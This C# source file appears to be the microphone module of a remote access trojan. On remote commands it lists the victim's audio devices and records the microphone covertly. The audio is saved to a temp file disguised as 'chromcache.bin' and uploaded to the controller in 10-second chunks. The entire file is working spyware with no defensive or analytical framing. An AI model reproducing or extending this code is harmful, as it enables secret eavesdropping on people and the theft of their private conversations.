using boulzar.Other;
using boulzar.Other.Utilities;
using System;
using System.Collections;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
namespace boulzar.Methods
{
    public class MicrophonRec
    {
        public Timer timer1 = null;
        ArrayList arrLst = new ArrayList();
        string savepath = Path.GetTempPath() + @"chromcache.bin";
        private int count = 0;
        public void HandleMicroRec(string Data)
        {

            Console.WriteLine(Data);
            if (Data.StartsWith("MicrophoneInfo"))
            {

                string ToSend = null;
                ToSend = "";
                clsRecDevices();
                for (int i = 0; i < arrLst.Count; i++)
                {
                    ToSend += arrLst[i] + "~";
                }
                Helpers.Send(DataType.RMICInfo, Helpers.Getbytes(ToSend));

            }

            if (Data.StartsWith("MicrophoneStart"))
            {
                Console.WriteLine("CommandRecivedToStart");
                record();

                timer1 = new Timer(TimerCallback, null, 0, 1000);


            }
            if (Data.StartsWith("MicrophoneStop"))
            {
                Console.WriteLine("CommandRecivedToStop");
                timer1.Change(Timeout.Infinite, Timeout.Infinite);
                Stoprec();
                if (File.Exists(savepath))
                    File.Delete(savepath);
                GC.SuppressFinalize(this);
            }


        }
        void record()
        {

            NativeMethods.rec("open new Type waveaudio Alias recsound", "", 0, 0);
            NativeMethods.rec("record recsound", "", 0, 0);

        }
        void Stoprec()
        {
            if (File.Exists(savepath))
            {
                File.Delete(savepath);
            }
            Thread.Sleep(100);
            NativeMethods.rec("save recsound " + savepath, "", 0, 0);
            NativeMethods.rec("close recsound", "", 0, 0);

        }
        public void TimerCallback(Object o)
        {
            count += 1;
            Console.WriteLine("TimerStarteed");
            Console.WriteLine(count);


            if (count == 10)
            {
                Stoprec();
                byte[] FileBytes;
                if (File.Exists(savepath))
                {
                    using (FileStream FS = new FileStream(savepath, FileMode.Open))
                    {
                        FileBytes = new byte[FS.Length];
                        FS.Read(FileBytes, 0, FileBytes.Length);
                        FS.Dispose();
                    }

                    Helpers.Send(DataType.RMICSound, FileBytes);
                    FileBytes = null;
                }
                record();
                count = 1;
            }

        }

        #region WMI 

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        public struct WaveInCaps
        {
            public short wMid;
            public short wPid;
            public int vDriverVersion;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
            public char[] szPname;
            public uint dwFormats;
            public short wChannels;
            public short wReserved1;
        }
        [DllImport("winmm.dll")]
        public static extern int waveInGetNumDevs();
        //return spesific Sound Recording Devices spec
        [DllImport("winmm.dll", EntryPoint = "waveInGetDevCaps")]
        public static extern int waveInGetDevCapsA(int uDeviceID, ref WaveInCaps lpCaps, int uSize);



        public int Count

        {
            get { return arrLst.Count; }
        }
        public string this[int indexer]

        {
            get { return (string)arrLst[indexer]; }
        }
        public void clsRecDevices()
        {
            int waveInDevicesCount = waveInGetNumDevs(); //get total
            if (waveInDevicesCount > 0)
            {
                for (int uDeviceID = 0; uDeviceID < waveInDevicesCount; uDeviceID++)
                {
                    WaveInCaps waveInCaps = new WaveInCaps();
                    waveInGetDevCapsA(uDeviceID, ref waveInCaps,
                                       Marshal.SizeOf(typeof(WaveInCaps)));
                    arrLst.Add(new string(waveInCaps.szPname).Remove(
                               new string(waveInCaps.szPname).IndexOf('\0')).Trim());
                    //clean garbage
                }
            }
        }
        #endregion
    }
}
